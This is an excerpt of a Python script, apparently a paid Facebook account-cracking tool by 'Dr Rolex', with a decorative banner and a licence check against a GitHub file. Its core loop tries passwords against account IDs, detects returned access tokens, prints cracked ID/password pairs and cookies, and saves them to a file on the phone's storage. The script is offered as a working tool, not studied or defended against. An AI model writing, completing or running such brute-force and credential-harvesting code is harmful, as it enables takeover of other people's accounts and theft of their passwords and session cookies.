# =[•]=[SCRIPT]=[ADMIN]=[DR ROLEX]=[•]=
#SCRIPT OWNER ____DR-ROLEX
#CODE BY DR ROLEX
#----------------------------------------------------------------#
import os
...
╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═  
{G}⋆{GGG}\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m AUTHOR    \x1b[1;97m ● \x1b[1;92mDr_Rolex             
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47mFACEBOOK  \x1b[1;97m ● \x1b[1;92mMD Rolex            
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;48mGITHUB    \x1b[1;97m ● \x1b[1;92mRolex-143      
...
def menu():
  ...
  try:
    httpCaht = requests.get('https://github.com/RoLEX-143/PAID/blob/main/Approve.txt').text    
    if id in httpCaht:
    ...
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bROLEX}[{G}RIMON-OK{bRIMON}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bROLEX}[{G}•{bRIMON}]{G} '+kuki+'')
                linex()
                open('/sdcard/ROLEX-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+cookie+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
